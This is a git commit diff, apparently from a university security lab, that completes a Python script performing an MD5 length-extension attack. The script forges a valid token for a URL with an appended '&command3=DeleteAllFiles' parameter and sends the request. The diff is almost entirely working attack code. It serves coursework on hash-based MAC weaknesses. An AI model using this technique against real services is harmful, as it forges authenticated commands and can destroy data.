f392ff7ea473c1e8f58d2ab384fa641f01d429bf
Ting <tingshen.chen@gmail.com>
2013-09-12 23:23:20 -0400

    WOOOOOOOOOOOOOOO HACKED

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -1,9 +1,30 @@
-import httplib, urlparse, sys
+import httplib, urlparse, sys, urllib
 url = sys.argv[1]
 
-# Your code to modify url goes here
+from pymd5 import md5, padding
 
-parsedUrl = urlparse.urlparse(url)
+# split around equal and ampersand to get token
+token = url.split('=')[1].split('&')[0]
+
+# split ampersand and generate message
+params = url.split('&')
+
+# generate original message
+message = params[1] + "&" + params[2] + "&" + params[3]
+
+
+m_len = 8 + len(message)
+bits = (m_len + len(padding(m_len*8)))*8
+
+h = md5(state=token.decode("hex"), count=bits)
+killamessage = "&command3=DeleteAllFiles"
+h.update(killamessage)
+killatoken = h.hexdigest()
+
+
+killaurl = url.split('=')[0] + "=" + killatoken + "&" + message + urllib.quote(padding(m_len*8)) + killamessage
+parsedUrl = urlparse.urlparse(killaurl)
 conn = httplib.HTTPConnection(parsedUrl.hostname)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
+
 print conn.getresponse().read()
